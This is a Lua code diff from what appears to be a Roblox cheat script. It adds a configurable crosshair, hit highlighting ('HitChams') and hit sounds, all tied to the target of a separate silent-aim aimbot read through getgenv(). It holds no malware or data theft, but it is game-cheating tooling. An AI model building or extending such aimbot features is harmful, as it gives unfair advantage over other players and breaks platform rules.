+            crosshairAngle = crosshairAngle + CrosshairConfig.RotSpeed * dt
+        else
+            crosshairAngle = CrosshairConfig.StaticAngle
+        end
+        local rad = math.rad(crosshairAngle)
+        local cosA, sinA = math.cos(rad), math.sin(rad)
+        local function rot(x, y)
+            return V2.new(cosA * x - sinA * y, sinA * x + cosA * y)
+        end
+        local points = {
+            {V2.new(0, -CrosshairConfig.Length/2 - CrosshairConfig.Spacing), V2.new(0, -CrosshairConfig.Spacing)},
+            {V2.new(0, CrosshairConfig.Spacing), V2.new(0, CrosshairConfig.Length/2 + CrosshairConfig.Spacing)},
+            {V2.new(-CrosshairConfig.Length/2 - CrosshairConfig.Spacing, 0), V2.new(-CrosshairConfig.Spacing, 0)},
+            {V2.new(CrosshairConfig.Spacing, 0), V2.new(CrosshairConfig.Length/2 + CrosshairConfig.Spacing, 0)}
+        }
+        for i = 1, 4 do
+            local startPoint = rot(points[i][1].X, points[i][1].Y)
+            local endPoint = rot(points[i][2].X, points[i][2].Y)
+            if CrosshairConfig.Outline and crosshairOutlines[i] then
+                local ol = crosshairOutlines[i]
+                ol.Visible = true
+                ol.Thickness = CrosshairConfig.OutlineThickness
+                ol.Color = CrosshairConfig.OutlineColor
+                ol.From = mousePos + startPoint
+                ol.To = mousePos + endPoint
+                ol.ZIndex = 0
+            elseif crosshairOutlines[i] then
+                crosshairOutlines[i].Visible = false
+            end
+            local l = crosshairLines[i]
+            l.Visible = true
+            l.Thickness = CrosshairConfig.Thickness
+            l.Color = CrosshairConfig.Color
+            l.From = mousePos + startPoint
+            l.To = mousePos + endPoint
+            l.ZIndex = 1
+        end
+    end)
+end
+
+CrosshairGroup:AddToggle('CrosshairEnabled', {
+    Text = 'Crosshair',
+    Default = false,
+    Callback = function(v)
+        CrosshairConfig.Enabled = v
+        if v then createCrosshair() else destroyCrosshair() end
+    end
+})
+:AddColorPicker('CrosshairColor', {
+    Default = CrosshairConfig.Color,
+    Title = 'Color',
+    Callback = function(val) CrosshairConfig.Color = val end
+})
+
+CrosshairGroup:AddSlider('CrosshairLength', {
+    Text = 'Length',
+    Default = CrosshairConfig.Length,
+    Min = 10, Max = 300, Rounding = 0,
+    Callback = function(val) CrosshairConfig.Length = val end
+})
+CrosshairGroup:AddSlider('CrosshairSpacing', {
+    Text = 'Spacing',
+    Default = CrosshairConfig.Spacing,
+    Min = 0, Max = 30, Rounding = 0,
+    Callback = function(val) CrosshairConfig.Spacing = val end
+})
+CrosshairGroup:AddSlider('CrosshairThickness', {
+    Text = 'Thickness',
+    Default = CrosshairConfig.Thickness,
+    Min = 1, Max = 10, Rounding = 0,
+    Callback = function(val) CrosshairConfig.Thickness = val end
+})
+CrosshairGroup:AddSlider('CrosshairRotSpeed', {
+    Text = 'RotSpeed',
+    Default = CrosshairConfig.RotSpeed,
+    Min = 0, Max = 1000, Rounding = 0,
+    Callback = function(val) CrosshairConfig.RotSpeed = val end
+})
+CrosshairGroup:AddToggle('CrosshairRotate', {
+    Text = 'Rotate',
+    Default = CrosshairConfig.Rotate,
+    Callback = function(v)
+        CrosshairConfig.Rotate = v
+        if not v then
+            crosshairAngle = CrosshairConfig.StaticAngle
+        end
+    end
+})
+CrosshairGroup:AddToggle('CrosshairOutline', {
+    Text = 'Outline',
+    Default = CrosshairConfig.Outline,
+    Callback = function(v)
+        CrosshairConfig.Outline = v
+        if CrosshairConfig.Enabled then createCrosshair() end
+    end
+})
+:AddColorPicker('CrosshairOutlineColor', {
+    Default = CrosshairConfig.OutlineColor,
+    Title = 'Outline Color',
+    Callback = function(val) CrosshairConfig.OutlineColor = val end
+})
+CrosshairGroup:AddSlider('CrosshairOutlineThickness', {
+    Text = 'Outline Th.',
+    Default = CrosshairConfig.OutlineThickness,
+    Min = 1, Max = 20, Rounding = 0,
+    Callback = function(val) CrosshairConfig.OutlineThickness = val end
+})
+
+CrosshairGroup:AddToggle('CrosshairAttachToTarget', {
+    Text = 'Attach to Target',
+    Default = false,
+    Callback = function(v) CrosshairConfig.AttachToTarget = v end,
+    Tooltip = 'Прицел крепится к цели (SilentAim)' 
+})
+CrosshairGroup:AddDropdown('CrosshairAttachPart', {
+    Text = 'Attach Part',
+    Values = {'UpperTorso', 'HumanoidRootPart', 'Head', 'LowerTorso'},
+    Default = 'UpperTorso',
+    Callback = function(val) CrosshairConfig.AttachPart = val end,
+    Tooltip = 'К какой части цели крепить прицел'
+})
+
+CrosshairGroup:AddSlider('CrosshairAngle', {
+    Text = 'Angle',
+    Default = CrosshairConfig.StaticAngle,
+    Min = 0, Max = 360, Rounding = 0,
+    Callback = function(val)
+        CrosshairConfig.StaticAngle = val
+        if not CrosshairConfig.Rotate then
+            crosshairAngle = val
+        end
+    end
+})
+
+-- Hotkey for rotate toggle (R)
+S.UIS.InputBegan:Connect(function(input, gameProcessed)
+    if input.KeyCode == Enum.KeyCode.R and not gameProcessed and CrosshairConfig.Enabled then
+        CrosshairConfig.Rotate = not CrosshairConfig.Rotate
+    end
+end)
+
+-- === HitChams (Combat tab, правая секция) ===
+local HitChamsConfig = {
+    Enabled = false,
+    Material = Enum.Material.Neon,
+    Duration = 2,
+    Color = Color3.fromRGB(255, 0, 0),
+    Transparency = 0,
+}
+
+-- ВОССТАНОВЛЕНИЕ HitChams
+local function HitChams(Player, config)
+    config = config or HitChamsConfig
+    if not config.Enabled then return end
+    if Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
+        Player.Character.Archivable = true
+        local Cloned = Player.Character:Clone()
+        Cloned.Name = "Player Clone"
+        local BodyParts = {
+            "Head", "UpperTorso", "LowerTorso",
+            "LeftUpperArm", "LeftLowerArm", "LeftHand",
+            "RightUpperArm", "RightLowerArm", "RightHand",
+            "LeftUpperLeg", "LeftLowerLeg", "LeftFoot",
+            "RightUpperLeg", "RightLowerLeg", "RightFoot"
+        }
+        for _, Part in ipairs(Cloned:GetChildren()) do
+            if Part:IsA("BasePart") then
+                local PartValid = false
+                for _, validPart in ipairs(BodyParts) do
+                    if Part.Name == validPart then
+                        PartValid = true
+                        break
+                    end
+                end
+                if not PartValid then
+                    Part:Destroy()
+                end
+            elseif Part:IsA("Accessory") or Part:IsA("Tool") or Part.Name == "face" or Part:IsA("Shirt") or Part:IsA("Pants") or Part:IsA("Hat") then
+                Part:Destroy()
+            end
+        end
+        if Cloned:FindFirstChild("Humanoid") then
+            Cloned.Humanoid:Destroy()
+        end
+        for _, BodyPart in ipairs(Cloned:GetChildren()) do
+            if BodyPart:IsA("BasePart") then
+                BodyPart.CanCollide = false
+                BodyPart.Anchored = true
+                BodyPart.Transparency = config.Transparency
+                BodyPart.Color = config.Color
+                BodyPart.Material = config.Material
+            end
+        end
+        if Cloned:FindFirstChild("Head") then
+            local Head = Cloned.Head
+            Head.Transparency = config.Transparency
+            Head.Color = config.Color
+            Head.Material = config.Material
+            if Head:FindFirstChild("face") then
+                Head.face:Destroy()
+            end
+        end
+        Cloned.Parent = game.Workspace
+        local tweenInfo = TweenInfo.new(
+            config.Duration,
+            Enum.EasingStyle.Sine,
+            Enum.EasingDirection.InOut,
+            0,
+            true
+        )
+        for _, BodyPart in ipairs(Cloned:GetChildren()) do
+            if BodyPart:IsA("BasePart") then
+                local tween = game:GetService("TweenService"):Create(BodyPart, tweenInfo, { Transparency = 1 })
+                tween:Play()
+            end
+        end
+        task.delay(config.Duration, function()
+            if Cloned and Cloned.Parent then
+                Cloned:Destroy()
+            end
+        end)
+    end
+end
+
+-- === HitSounds (инлайн-модуль) ===
+local HitSoundsConfig = {
+    Enabled = false,
+    Sound = "Bameware",
+    Volume = 1,
+}
+local hitsounds = {
+    ["RIFK7"]        = "rbxassetid://9102080552",
+    ["Bubble"]       = "rbxassetid://6534947588",
+    ["Minecraft"]    = "rbxassetid://8837706727",
+    ["Cod"]          = "rbxassetid://160432334",
+    ["Bameware"]     = "rbxassetid://3124331820",
+    ["Neverlose"]    = "rbxassetid://6534948092",
+    ["Gamesense"]    = "rbxassetid://4817809188",
+    ["Rust"]         = "rbxassetid://1255040462",
+    ["Bruh"]         = "rbxassetid://4578740568",
+    ["Bell"]         = "rbxassetid://6534947240",
+    ["Pick"]         = "rbxassetid://1347140027",
+    ["Pop"]          = "rbxassetid://198598793",
+    ["Sans"]         = "rbxassetid://3188795283",
+    ["Fart"]         = "rbxassetid://130833677",
+    ["Big"]          = "rbxassetid://5332005053",
+    ["Vine"]         = "rbxassetid://5332680810",
+    ["Fatality"]     = "rbxassetid://6534947869",
+    ["Bonk"]         = "rbxassetid://5766898159",
+    ["Totem"]        = "rbxassetid://135055101757201",
+    ["CSHS"]         = "rbxassetid://9065951723",
+}
+local function PlayHitSound(config)
+    config = config or HitSoundsConfig
+    if not config.Enabled then return end
+    local soundId = hitsounds[config.Sound]
+    if not soundId then return end
+    local sound = Instance.new("Sound")
+    sound.SoundId = soundId
+    sound.Volume = config.Volume or 1
+    sound.Parent = S.SS
+    sound:Play()
+    sound.Ended:Connect(function()
+        sound:Destroy()
+    end)
+end
+
+local HitChamsGroup = Tabs.Combat:AddRightGroupbox('>_<')
+local HitChamsToggle = HitChamsGroup:AddToggle('HitChamsEnabled', {
+    Text = 'HitChams',
+    Default = false,
+    Callback = function(v) HitChamsConfig.Enabled = v end,
+    Tooltip = 'Show chams on aimbot target when HP decreases.'
+})
+:AddColorPicker('HitChamsColor', {
+    Default = HitChamsConfig.Color,
+    Title = 'Color',
+    Callback = function(val) HitChamsConfig.Color = val end
+})
+
+-- Саббокс для HitChams
+local HitChamsSub = HitChamsGroup:AddDependencyBox()
+HitChamsSub:AddSlider('HitChamsDuration', {
+    Text = 'Duration',
+    Default = HitChamsConfig.Duration,
+    Min = 0.2, Max = 5, Rounding = 2,
+    Callback = function(val) HitChamsConfig.Duration = val end
+})
+HitChamsSub:AddSlider('HitChamsTransparency', {
+    Text = 'Transparency',
+    Default = HitChamsConfig.Transparency,
+    Min = 0, Max = 1, Rounding = 2,
+    Callback = function(val) HitChamsConfig.Transparency = val end
+})
+HitChamsSub:AddDropdown('HitChamsMaterial', {
+    Text = 'Material',
+    Values = {'Neon', 'ForceField', 'Plastic', 'SmoothPlastic', 'Glass'},
+    Default = 'Neon',
+    Callback = function(val)
+        local mat = Enum.Material[val] or Enum.Material.Neon
+        HitChamsConfig.Material = mat
+    end
+})
+HitChamsSub:SetupDependencies({{Toggles.HitChamsEnabled, true}})
+
+-- Тоггл и саббокс для HitSounds
+local HitSoundsToggle = HitChamsGroup:AddToggle('HitSoundsEnabled', {
+    Text = 'HitSounds',
+    Default = false,
+    Callback = function(v) HitSoundsConfig.Enabled = v end,
+    Tooltip = 'Play sound on aimbot hit.'
+})
+local HitSoundsSub = HitChamsGroup:AddDependencyBox()
+HitSoundsSub:AddDropdown('HitSoundsSound', {
+    Text = 'Sound',
+    Values = (function() local t = {}; for k in pairs(hitsounds) do table.insert(t, k) end; table.sort(t); return t end)(),
+    Default = HitSoundsConfig.Sound,
+    Callback = function(val) HitSoundsConfig.Sound = val end
+})
+HitSoundsSub:AddSlider('HitSoundsVolume', {
+    Text = 'Volume',
+    Default = HitSoundsConfig.Volume,
+    Min = 0, Max = 3, Rounding = 2,
+    Callback = function(val) HitSoundsConfig.Volume = val end
+})
+HitSoundsSub:SetupDependencies({{Toggles.HitSoundsEnabled, true}})
+
+-- Логика: отслеживание уменьшения HP у цели аимбота
+local lastTarget, lastHP
+RND:Connect(function()
+    if not HitChamsConfig.Enabled and not HitSoundsConfig.Enabled then
+        lastTarget, lastHP = nil, nil
+        return
+    end
+    local target = getgenv().SilentAim and getgenv().SilentAim.currentTarget
+    if target and target.Character and target.Character:FindFirstChild('Humanoid') then
+        local hum = target.Character.Humanoid
+        local hp = hum.Health
+        if lastTarget ~= target then
+            lastTarget = target
+            lastHP = hp
+        else
+            if hp < lastHP then
+                if HitChamsConfig.Enabled then
+                    HitChams(target, HitChamsConfig)
+                end
+                if HitSoundsConfig.Enabled then
+                    PlayHitSound(HitSoundsConfig)
+                end
+            end
+            lastHP = hp
+        end
+    else
+        lastTarget, lastHP = nil, nil
+    end
+end)
